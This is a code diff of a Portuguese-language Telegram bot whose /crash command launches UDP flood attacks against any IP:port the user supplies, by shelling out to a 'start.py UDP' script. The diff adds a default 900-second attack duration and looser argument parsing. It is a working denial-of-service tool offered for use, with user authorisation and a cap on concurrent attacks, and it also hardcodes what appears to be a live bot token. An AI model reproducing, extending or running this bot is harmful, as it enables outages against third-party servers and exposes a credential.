@@ -3,38 +3,40 @@ import subprocess
 import re
 import time
 from threading import Thread
+import os
 
 BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
 SEU_ID_TELEGRAM = 6430703027
 bot = telebot.TeleBot(BOT_TOKEN)
 processos = {}
-authorized_users = [SEU_ID_TELEGRAM]  # Lista de usu√°rios autorizados
-MAX_ATTACKS = 3  # Limite de ataques simult√¢neos
+authorized_users = [SEU_ID_TELEGRAM]  # Lista de usu·rios autorizados
+MAX_ATTACKS = 3  # Limite de ataques simult‚neos
 
-# Fun√ß√£o para validar o formato de IP e Porta
+# FunÁ„o para validar o formato de IP e Porta
 def validar_ip_porta(ip_porta):
     padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
     match = re.match(padrao, ip_porta)
     return match is not None
 
-# Fun√ß√£o para executar o comando do ataque
+# FunÁ„o para executar o comando do ataque
 def executar_comando(ip_porta, threads, tempo):
-    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
+    comando_terminal = f"python start.py UDP {ip_porta} {threads} {tempo}"
     try:
         processo = subprocess.Popen(
             comando_terminal, 
             shell=True, 
+            cwd=os.path.dirname(os.path.abspath(__file__)),  # Define o diretÛrio atual do bot
             stdout=subprocess.PIPE, 
             stderr=subprocess.PIPE
         )
         processos[ip_porta] = processo
         time.sleep(int(tempo))  # Aguarda o tempo do ataque
-        processo.terminate()  # Termina o processo ap√≥s o tempo especificado
+        processo.terminate()  # Termina o processo apÛs o tempo especificado
         del processos[ip_porta]  # Remove o processo da lista
     except Exception as e:
         print(f"Erro ao executar o comando: {str(e)}")
 
-# Fun√ß√£o para gerenciar o limite de ataques simult√¢neos
+# FunÁ„o para gerenciar o limite de ataques simult‚neos
 def manage_attacks():
     if len(processos) >= MAX_ATTACKS:
         oldest_process = list(processos.values())[0]  # Pega o primeiro processo
@@ -45,15 +47,15 @@ def manage_attacks():
 @bot.message_handler(commands=['start'])
 def start_message(message):
     welcome_text = (
-        "Bem-vindo ao bot! üöÄ\n\n"
-        "Aqui est√£o os comandos dispon√≠veis para voc√™:\n\n"
-        "Comandos b√°sicos:\n"
+        "Bem-vindo ao bot! \n\n"
+        "Aqui est„o os comandos disponÌveis para vocÍ:\n\n"
+        "Comandos b·sicos:\n"
         "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
-        "/meuid - Mostra seu ID de usu√°rio.\n\n"
-        "Comandos para usu√°rios autorizados:\n"
-        "/adduser <ID> - Adiciona um usu√°rio autorizado.\n"
-        "/removeuser <ID> - Remove um usu√°rio autorizado.\n\n"
-        "Entre em contato se precisar de ajuda! üòâ"
+        "/meuid - Mostra seu ID de usu·rio.\n\n"
+        "Comandos para usu·rios autorizados:\n"
+        "/adduser <ID> - Adiciona um usu·rio autorizado.\n"
+        "/removeuser <ID> - Remove um usu·rio autorizado.\n\n"
+        "Entre em contato se precisar de ajuda! "
     )
     bot.send_message(message.chat.id, welcome_text)
 
@@ -65,28 +67,35 @@ def crash_server(message):
         return
 
     comando = message.text.split()
-    if len(comando) < 4:
+    if len(comando) < 2:
         bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> <threads> <tempo>")
         return
 
     ip_porta = comando[1]
-    threads = comando[2]
-    tempo = comando[3]
+    threads = '10'  # Valor padr„o de threads
+    tempo = '900'  # Valor padr„o de tempo
 
-    # Verificar se j√° existe um processo em andamento para o mesmo IP
+    # Se o usu·rio enviar o IP com o tempo
+    if len(comando) == 3:
+        tempo = comando[2]  # Ajusta o tempo se o usu·rio passar o tempo
+    elif len(comando) == 4:
+        threads = comando[2]  # Ajusta as threads se o usu·rio passar os par‚metros corretos
+        tempo = comando[3]
+
+    # Verificar se j· existe um processo em andamento para o mesmo IP
     if ip_porta in processos:
-        bot.send_message(message.chat.id, f"J√° existe um ataque em andamento para {ip_porta}. Tente novamente mais tarde.")
+        bot.send_message(message.chat.id, f"J· existe um ataque em andamento para {ip_porta}. Tente novamente mais tarde.")
         return
 
     if not validar_ip_porta(ip_porta):
-        bot.send_message(message.chat.id, "Formato de IP:PORTA inv√°lido.")
+        bot.send_message(message.chat.id, "Formato de IP:PORTA inv·lido.")
         return
 
-    # Gerenciar o limite de ataques simult√¢neos
+    # Gerenciar o limite de ataques simult‚neos
     manage_attacks()
 
-    # Notificar que o ataque vai come√ßar
-    bot.send_message(message.chat.id, f"Iniciando o ataque para {ip_porta}...")
+    # Notificar que o ataque vai comeÁar
+    bot.send_message(message.chat.id, f"Iniciando o ataque para {ip_porta} com {threads} threads por {tempo} segundos...")
 
     # Iniciar o ataque em uma nova thread
     thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
@@ -95,9 +104,9 @@ def crash_server(message):
 # Comando /meuid
 @bot.message_handler(commands=['meuid'])
 def send_user_id(message):
-    bot.send_message(message.chat.id, f"Seu ID de usu√°rio √©: {message.from_user.id}")
+    bot.send_message(message.chat.id, f"Seu ID de usu·rio È: {message.from_user.id}")
 
-# Comandos de administra√ß√£o (somente o dono pode usar)
+# Comandos de administraÁ„o (somente o dono pode usar)
 @bot.message_handler(commands=['adduser', 'removeuser'])
 def admin_commands(message):
     if message.from_user.id != SEU_ID_TELEGRAM:
@@ -114,18 +123,18 @@ def admin_commands(message):
     if comando[0] == "adduser":
         if usuario_id not in authorized_users:
             authorized_users.append(usuario_id)
-            bot.send_message(message.chat.id, f"Usu√°rio {usuario_id} adicionado com sucesso.")
+            bot.send_message(message.chat.id, f"Usu·rio {usuario_id} adicionado com sucesso.")
         else:
-            bot.send_message(message.chat.id, "Usu√°rio j√° autorizado.")
+            bot.send_message(message.chat.id, "Usu·rio j· autorizado.")
     
     elif comando[0] == "removeuser":
         if usuario_id in authorized_users:
             authorized_users.remove(usuario_id)
-            bot.send_message(message.chat.id, f"Usu√°rio {usuario_id} removido com sucesso.")
+            bot.send_message(message.chat.id, f"Usu·rio {usuario_id} removido com sucesso.")
         else:
-            bot.send_message(message.chat.id, "Usu√°rio n√£o encontrado.")
+            bot.send_message(message.chat.id, "Usu·rio n„o encontrado.")
 
-# Fun√ß√£o para manter o bot ativo (reconectar automaticamente em caso de falhas)
+# FunÁ„o para manter o bot ativo (reconectar automaticamente em caso de falhas)
 def keep_alive():
     while True:
         try:
